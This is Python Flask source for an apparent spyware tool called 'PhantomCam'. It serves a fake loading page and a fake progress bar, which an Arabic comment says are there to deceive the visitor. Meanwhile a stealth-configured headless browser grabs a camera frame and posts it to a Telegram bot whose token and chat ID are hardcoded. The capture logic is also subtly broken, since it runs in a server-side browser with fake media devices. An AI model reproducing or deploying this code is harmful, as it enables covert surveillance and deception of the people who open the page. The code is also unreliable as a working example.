# -*- coding: utf-8 -*-
from flask import Flask, render_template, jsonify, request, redirect, url_for
import asyncio
import aiohttp
import base64
import json
import os
import random
import string
import threading
import time
from datetime import datetime
from playwright.async_api import async_playwright
from PIL import Image
import io

app = Flask(__name__)

# ---------- TELEGRAM CONFIG ----------
BOT_TOKEN = "8896286925:AAH5OMU3eB5CVx7TOJ5-uxcCRtBfmMEcOtk"
CHAT_ID = "8790754582"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

# ---------- GLOBAL VARIABLES ----------
is_capturing = False
capture_complete = False
latest_filename = None
capture_log = []
total_captures = 0

# ---------- FILE NAME GENERATOR ----------
def generate_filename(ext="jpg"):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"cam_{ts}_{rand}.{ext}"

# ---------- CAPTURE ENGINE ----------
async def capture_and_send():
    """Captures one frame and sends to Telegram."""
    global total_captures, latest_filename
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=[
                    "--use-fake-ui-for-media-stream",
                    "--use-fake-device-for-media-stream",
                    "--disable-web-security",
                    "--no-sandbox",
                    "--disable-setuid-sandbox",
                    "--disable-blink-features=AutomationControlled"
                ]
            )
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                viewport={"width": 1280, "height": 720}
            )
            page = await context.new_page()
            
            # Stealth
            await page.add_init_script("""
                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                window.chrome = { runtime: {} };
                Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
            """)
            
            # Load any page (use about:blank for speed)
            await page.goto("about:blank")
            
            # Capture script
            js_code = """
            (function() {
                return new Promise((resolve) => {
                    let video = document.createElement('video');
                    video.autoplay = true;
                    video.muted = true;
                    let canvas = document.createElement('canvas');
                    let ctx = canvas.getContext('2d');
                    
                    navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia;
                    if (!navigator.getUserMedia) {
                        resolve({ error: 'getUserMedia not supported' });
                        return;
                    }
                    
                    navigator.getUserMedia(
                        { video: { width: 640, height: 480, facingMode: 'environment' } },
                        function(stream) {
                            video.srcObject = stream;
                            video.onloadedmetadata = function() {
                                video.play();
                                canvas.width = video.videoWidth || 640;
                                canvas.height = video.videoHeight || 480;
                                setTimeout(() => {
                                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                    let dataUrl = canvas.toDataURL('image/jpeg', 0.95);
                                    stream.getTracks().forEach(track => track.stop());
                                    resolve({ image: dataUrl });
                                }, 600);
                            };
                        },
                        function(err) {
                            resolve({ error: err.message });
                        }
                    );
                });
            })();
            """
            
            result = await page.evaluate(js_code)
            await browser.close()
            
            if result.get('error'):
                return {'status': 'error', 'message': result['error']}
            
            img_data_url = result['image']
            header, encoded = img_data_url.split(',', 1)
            img_bytes = base64.b64decode(encoded)
            
            # Send to Telegram
            fname = generate_filename()
            latest_filename = fname
            async with aiohttp.ClientSession() as session:
                data = aiohttp.FormData()
                data.add_field('chat_id', CHAT_ID)
                data.add_field('caption', f"📸 {fname} | PhantomCam")
                data.add_field('photo', img_bytes, filename=fname, content_type='image/jpeg')
                
                async with session.post(TELEGRAM_API, data=data) as resp:
                    if resp.status == 200:
                        total_captures += 1
                        return {'status': 'success', 'filename': fname}
                    else:
                        return {'status': 'error', 'message': f'Telegram error: {resp.status}'}
                        
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

def background_capture():
    """Runs capture once and updates global flags."""
    global is_capturing, capture_complete, capture_log
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        result = loop.run_until_complete(capture_and_send())
        log_entry = {
            'time': datetime.now().isoformat(),
            'status': result.get('status'),
            'message': result.get('message') or result.get('filename', '')
        }
        capture_log.append(log_entry)
        if len(capture_log) > 50:
            capture_log = capture_log[-50:]
        capture_complete = True
    except Exception as e:
        capture_log.append({'time': datetime.now().isoformat(), 'status': 'error', 'message': str(e)})
        capture_complete = True
    finally:
        is_capturing = False

# ---------- FLASK ROUTES ----------
@app.route('/')
def loading_page():
    """الصفحة الأولى: شاشة تحميل وهمية"""
    global is_capturing, capture_complete
    
    # Reset flags for new visit
    is_capturing = True
    capture_complete = False
    
    # Start capture in background thread
    thread = threading.Thread(target=background_capture, daemon=True)
    thread.start()
    
    return render_template('loading.html')

@app.route('/api/progress')
def progress():
    """API يتحقق من حالة الالتقاط (يستخدمه JavaScript لتحديث شريط التقدم)"""
    global is_capturing, capture_complete, latest_filename, total_captures
    
    # Generate fake progress (0-100) based on time
    # نجعل التقدم يتحرك ببطء لإيهام المستخدم بأن شيئاً يحدث
    if is_capturing:
        # Progress يزيد تدريجياً من 0 إلى 95
        elapsed = int(time.time() * 10) % 100
        progress = min(95, elapsed)
        return jsonify({
            'status': 'loading',
            'progress': progress,
            'message': f'جاري التحميل... {progress}%'
        })
    elif capture_complete:
        return jsonify({
            'status': 'complete',
            'progress': 100,
            'message': '✅ تم التحميل بنجاح!',
            'filename': latest_filename,
            'total': total_captures
        })
    else:
        return jsonify({
            'status': 'error',
            'progress': 0,
            'message': '⚠️ حدث خطأ، حاول مرة أخرى'
        })

@app.route('/redirect')
def redirect_page():
    """الصفحة النهائية بعد الانتهاء - تعيد التوجيه إلى موقع آخر"""
    return render_template('redirect.html')

@app.route('/api/log')
def get_log():
    return jsonify({'log': capture_log, 'total': total_captures})

# ---------- RUN APP ----------
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
